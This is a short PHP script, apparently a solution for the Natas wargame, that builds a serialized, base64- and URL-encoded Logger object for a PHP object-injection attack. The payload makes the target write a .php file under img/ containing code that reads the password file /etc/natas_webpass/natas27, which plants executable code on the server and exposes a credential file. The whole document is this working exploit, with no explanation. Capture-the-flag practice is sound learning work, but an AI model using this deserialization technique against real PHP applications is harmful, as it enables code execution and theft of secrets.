<?
    class Logger{
        private $logFile = "img/passwordofnatas27.php";
        private $exitMsg = "<? echo file_get_contents('/etc/natas_webpass/natas27') ?>";
    }

    print urlencode(base64_encode(serialize(new Logger)));
?>